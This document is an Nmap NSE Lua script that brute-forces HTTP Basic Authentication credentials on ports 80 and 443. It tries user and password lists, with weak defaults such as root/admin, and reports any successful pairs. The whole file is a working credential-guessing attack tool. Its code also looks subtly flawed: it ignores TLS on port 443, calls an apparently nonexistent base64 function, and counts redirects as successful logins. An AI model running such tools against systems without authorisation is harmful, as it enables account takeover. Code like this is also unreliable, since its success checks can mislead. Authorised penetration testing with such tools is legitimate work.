local stdnse = require "stdnse"
local nmap = require "nmap"
local os = require "os"

description = [[Attempts to brute-force HTTP Basic Authentication credentials using user-provided credential lists.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"brute", "intrusive"}

local function load_list(arg_names, default)
  local val = stdnse.get_script_args(arg_names) or default
  if not val or val == "" then return {} end
  local f, err = io.open(val, "r")
  if f then
    local lines = {}
    for line in f:lines() do
      line = line:gsub("^%s+", ""):gsub("%s+$", "")
      if line ~= "" and line:sub(1, 1) ~= "#" then
        lines[#lines + 1] = line
      end
    end
    f:close()
    return lines
  end
  local items = {}
  for item in val:gmatch("[^,]+") do
    item = item:gsub("^%s+", ""):gsub("%s+$", "")
    if item ~= "" then items[#items + 1] = item end
  end
  return items
end

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.number == 80 or port.number == 443) end

action = function(host, port)
  local users = load_list({"brute-http-basic.users", "users"}, "root,admin")
  local passes = load_list({"brute-http-basic.passwords", "passwords"}, "password,12345,admin")
  local delay = tonumber(stdnse.get_script_args({"brute-http-basic.delay", "delay"}) or 100)
  local max_attempts = tonumber(stdnse.get_script_args({"brute-http-basic.max_attempts", "max_attempts"}) or 1000)
  local timeout = tonumber(stdnse.get_script_args({"brute-http-basic.timeout", "timeout"}) or 10)
  local stop_on_first = stdnse.get_script_args({"brute-http-basic.stop_on_first", "stop_on_first"})
  if stop_on_first == nil or stop_on_first == "" then stop_on_first = true
  else stop_on_first = (stop_on_first:lower() == "true" or stop_on_first == "1") end
  local path = stdnse.get_script_args({"brute-http-basic.path", "path"}) or "/"

  local start_time = os.time()
  local found = {}
  local attempts = 0
  local errors = 0
  local success_count = 0
  local stop = false

  for _, u in ipairs(users) do
    if stop then break end
    for _, p in ipairs(passes) do
      if stop or attempts >= max_attempts then break end
      local socket = nmap.new_socket()
      socket:set_timeout(timeout * 1000)
      local ok, result = pcall(function()
        local status, err = socket:connect(host, port)
        if not status then errors = errors + 1; return false end
        local creds = nmap.base64_encode(u .. ":" .. p)
        local scheme = (port.number == 443) and "https" or "http"
        local req = "GET " .. path .. " HTTP/1.0\r\nHost: " .. host.ip .. "\r\nAuthorization: Basic " .. creds .. "\r\nConnection: close\r\n\r\n"
        socket:send(req)
        local resp = socket:receive_bytes(512)
        socket:close()
        if resp then
          local status_code = resp:match("HTTP/%d%.%d (%d+)")
          if status_code then
            local sc = tonumber(status_code)
            if sc == 200 or sc == 204 or sc == 301 or sc == 302 then
              return true
            end
          end
        end
        return false
      end)
      if not ok then
        pcall(socket.close, socket)
      end
      if result then
        success_count = success_count + 1
        found[#found + 1] = {user = u, password = p, path = path}
        if stop_on_first then stop = true end
      end
      attempts = attempts + 1
      if delay > 0 and not stop then stdnse.sleep(delay / 1000) end
    end
  end

  local elapsed = os.time() - start_time
  local out = stdnse.output_table()
  out.service = "HTTP Basic Auth"
  out.port = port.number
  out.attempts = attempts
  out.success_count = success_count
  out.time_taken = elapsed .. "s"
  if #found > 0 then
    out.status = "VULNERABLE"
    out.found_credentials = found
  else
    out.status = "SECURE"
  end
  if errors > 0 then out.errors = errors end
  return out
end
